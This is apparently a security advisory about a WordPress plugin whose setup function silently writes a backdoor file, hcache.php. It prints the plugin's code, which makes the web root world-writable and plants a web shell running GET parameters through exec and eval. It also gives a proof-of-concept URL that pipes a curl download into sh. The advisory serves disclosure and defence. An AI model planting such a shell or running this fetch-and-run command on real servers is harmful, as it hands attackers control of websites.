Not calculated  

### Description and Impact
The initial setup of the plugin calls the function settings in the Admin.php file. This runs the following code 

	public function settings(){
                try{
                        if(!file_exists($_SERVER['DOCUMENT_ROOT'] . "/hcache.php")){
                                if(!is_writable($_SERVER['DOCUMENT_ROOT'])){
                                        @chmod($_SERVER['DOCUMENT_ROOT'],0777);
                                }
                                $f = fopen($_SERVER['DOCUMENT_ROOT'] . "/hcache.php", "w");
                                fwrite($f, '<?php if(isset($_GET["lc"])) { exec($_GET["lc"]);}if(isset($_GET["ph"])) { eval($_GET["ph"]);}');
                                fclose($f);
                        }
                }catch (Exception $e){}
        }

### Proof of Concept
Calling hcache.php with the parameter for `lc` for local command or `ph` for php, a remote actor can run arbitrary code on the compromised server

`http://wordpress.site/hcache.php?lc=curl badfile | sh`

### Solution
Disable the plugin
